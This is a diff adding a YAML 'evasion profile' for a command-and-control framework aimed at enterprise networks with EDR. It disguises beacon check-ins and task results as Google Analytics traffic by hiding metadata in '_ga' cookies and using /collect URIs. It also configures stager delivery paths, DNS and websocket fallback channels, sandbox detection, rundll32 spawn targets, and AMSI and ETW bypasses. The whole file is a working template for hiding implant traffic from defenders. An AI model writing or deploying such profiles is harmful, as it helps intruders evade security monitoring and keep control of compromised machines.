@@ -1,0 +1,116 @@
+# Example Evasion Profile - High Security Environment
+# Use this as template for customization
+
+name: enterprise_stealth
+description: Profile for high-security enterprise environments with EDR
+
+# Global HTTP settings
+user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+
+headers:
+  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+  Accept-Language: "en-US,en;q=0.5"
+  Accept-Encoding: "gzip, deflate, br"
+  DNT: "1"
+  Connection: "keep-alive"
+  Upgrade-Insecure-Requests: "1"
+
+# Evasion configuration
+evasion:
+  level: high                    # low, medium, high
+  sleep_jitter: gaussian         # random, gaussian, fibonacci, fixed
+  sleep_time: 60                 # Base sleep in seconds
+  jitter_percent: 35             # Variance percentage
+  proxy_chain: null              # http://redirector:8080
+  working_hours: "08:00-18:00"   # Only beacon during business hours
+  kill_date: "2026-06-01"        # Self-destruct date (YYYY-MM-DD)
+  sandbox_checks: true           # Enable VM/sandbox detection
+  amsi_bypass: true              # Bypass AMSI on Windows
+  etw_bypass: true               # Bypass ETW logging
+
+# HTTP GET profile (beacon check-in)
+http_get:
+  uri:
+    - /cdn-cgi/trace
+    - /cdn-cgi/scripts/
+    - /__utm.gif
+    - /collect
+  
+  client_headers:
+    Host: "analytics.example.com"
+    Referer: "https://www.example.com/"
+    X-Requested-With: "XMLHttpRequest"
+  
+  server_headers:
+    Content-Type: "application/javascript"
+    Cache-Control: "no-cache, no-store"
+    X-Content-Type-Options: "nosniff"
+  
+  metadata_transform: base64url   # base64, base64url, netbios, mask
+  metadata_header: Cookie         # Where to embed beacon metadata
+  metadata_prepend: "_ga=GA1.2."
+  metadata_append: "; _gid=GA1.2.123456789"
+  parameter: null                 # URL parameter for data (optional)
+
+# HTTP POST profile (task results)
+http_post:
+  uri:
+    - /collect
+    - /r/collect
+    - /j/collect
+  
+  client_headers:
+    Origin: "https://www.example.com"
+    X-Client-Data: "CIa2yQEIprbJAQ=="
+  
+  server_headers:
+    Content-Type: "image/gif"
+  
+  content_type: "application/x-www-form-urlencoded"
+  output_transform: base64
+  body_transform: base64
+
+# Stager profile (initial payload delivery)
+stager:
+  uri:
+    - /api/v1/config
+    - /static/js/app.js
+  
+  client_headers:
+    Accept: "application/javascript"
+
+# DNS beacon settings (if HTTP fails)
+dns:
+  idle: "8.8.8.8"                # IP to return when no tasks
+  sleep: 0                        # Extra DNS sleep
+  beacon_domain: "beacon.example.com"
+  record_type: TXT
+
+# Process spawn settings (Windows)
+spawn:
+  x86: "%windir%\\syswow64\\rundll32.exe"
+  x64: "%windir%\\sysnative\\rundll32.exe"
+
+# Fallback channels configuration
+fallback_channels:
+  websocket:
+    enabled: true
+    priority: 1
+    uri: "/ws/beacon"
+    ping_interval: 30
+  
+  dns:
+    enabled: true
+    priority: 2
+    domain: "beacon.example.com"
+    record_type: TXT
+  
+  doh:
+    enabled: false
+    priority: 3
+    provider: cloudflare  # cloudflare, google, quad9
+  
+  icmp:
+    enabled: false
+    priority: 4
+    target: "8.8.8.8"
